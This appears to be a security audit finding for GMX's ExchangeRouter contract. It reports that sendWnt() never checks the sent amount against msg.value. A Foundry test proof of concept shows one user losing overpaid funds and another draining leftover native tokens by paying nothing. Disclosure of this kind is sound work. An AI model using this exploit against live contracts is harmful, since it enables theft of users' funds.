# ExchangeRouter#sendWnt() fails to check amount == msg.value, as a result, a user might lose funds to the contract and another user might steal funds from the contract.

## Summary
``ExchangeRouter#sendWnt()`` fails to check ``amount == msg.value``, as a result, a user might lose funds to the contract and another user might steal funds from the contract. 

## Vulnerability Detail
``ExchangeRouter#sendWnt()`` allows a user to send native tokens as wrapped native tokens to another user. 

[https://github.com/sherlock-audit/2023-04-gmx/blob/main/gmx-synthetics/contracts/router/ExchangeRouter.sol#L90C48-L93](https://github.com/sherlock-audit/2023-04-gmx/blob/main/gmx-synthetics/contracts/router/ExchangeRouter.sol#L90C48-L93)

However, the function fails to check that ``amount == msg.value``.  If ``msg.value > amoun``, then the sender will lose ``msg.value - amount`` in the contract. On the other hand, if ``amount > msg.value`` and if the contract has sufficient funds for covering ``amount``, then the sender can steal ``amount - msg.value`` from the contract. Actually the sender can steal all remaining native tokens in the contract using the later case. 

The following POC code confirms my finding:

1) The test contract sends 3000 native tokens but specifies 2000 for ``amount``, as a result, address(3) loses 1000 to the contract. The  recipient address(3) only receives 2000 WNT.

2) address(4) sends 1000 to himself while actually sending zero amount of native tokens. He just specifies the amount as 1000, since the contract contains 1000 native tokens, address(4) successfully steals the 1000 native tokens as WNT and sends them to himself.

```javascript
function testSendWNT() public {
    
        /* I send 3000 NT but specify amount as 2000 */
        bytes memory cdata = abi.encodeWithSelector(ExchangeRouter.sendWnt.selector, address(3), 2000);
        (bool success, ) = address(_erouter).call{value: 3000}(cdata);
        require(success);  
        /* address(3) only receives 2000, 1000 NT is stuck in contract  */
        console2.log(_wnt.balanceOf(address(3)));

        
        cdata = abi.encodeWithSelector(ExchangeRouter.sendWnt.selector, address(4), 1000);
        vm.prank(address(4));
        (success, ) = address(_erouter).call{value: 0}(cdata);
        require(success);

        /* address(4) steals the 1000 from the contract. */
        console2.log(_wnt.balanceOf(address(4)));        
}
```

## Impact
ExchangeRouter#sendWnt() fails to check ``amount == msg.value``, as a result, a user might lose funds to the contract and another user might steal funds from the contract.
